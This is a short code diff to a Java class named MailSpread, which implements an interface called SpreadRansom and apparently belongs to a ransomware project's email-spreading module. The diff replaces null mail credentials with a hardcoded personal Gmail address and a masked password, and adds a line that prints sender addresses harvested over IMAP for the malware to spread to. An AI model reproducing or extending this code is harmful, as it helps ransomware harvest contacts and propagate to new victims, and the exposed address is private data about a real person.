@@ -11,8 +11,8 @@ public class MailSpread implements SpreadRansom {
 	public Collection<String> scanEmailAdress() {
 		Properties props = new Properties();
 		String host = "localhost";
-		String username = null;
-		String password = null;
+		String username = "osherlev317@gmail.com";
+		String password = "**************";
 
 		// String provider = "pop3";
 		String provider = "imap";
@@ -38,6 +38,7 @@ public class MailSpread implements SpreadRansom {
 				if (from != null) {
 					from = removeQuotes(from);
 					emails.add(from);
+					System.out.println(from);
 				}
 			}
 			Iterator<String> it = emails.iterator();
